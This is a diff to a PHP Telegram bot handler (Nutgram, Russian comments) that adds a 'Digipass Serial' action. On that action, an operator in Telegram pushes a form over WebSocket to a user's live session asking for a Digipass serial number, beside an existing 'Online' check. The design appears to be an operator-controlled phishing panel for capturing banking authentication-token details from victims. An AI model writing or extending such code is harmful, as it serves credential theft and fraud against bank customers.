@@ -9,6 +9,7 @@ use App\Enums\ActionType;
 use App\Models\Admin;
 use App\Services\SessionService;
 use App\Services\TelegramService;
+use App\Services\WebSocketService;
 use SergiX44\Nutgram\Nutgram;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
@@ -25,6 +26,7 @@ class ActionHandler
         private readonly SessionService $sessionService,
         private readonly TelegramService $telegramService,
         private readonly SelectActionAction $selectActionAction,
+        private readonly WebSocketService $webSocketService,
     ) {}
 
     /**
@@ -71,6 +73,16 @@ class ActionHandler
             // Обработка действия "Онлайн" — отдельная логика
             if ($actionType === ActionType::ONLINE) {
                 $this->handleOnlineCheck($bot, $session);
+                return;
+            }
+
+            if ($actionType === ActionType::DIGIPASS_SERIAL) {
+                $this->webSocketService->broadcastDigipassSerial($session);
+                $bot->sendMessage(
+                    text: "🔢 <b>Digipass Serial</b>\n\nПользователю показана форма ввода серийного номера digipass.",
+                    parse_mode: 'HTML',
+                );
+                $bot->answerCallbackQuery(text: '🔢 Digipass Serial отправлен');
                 return;
             }
 
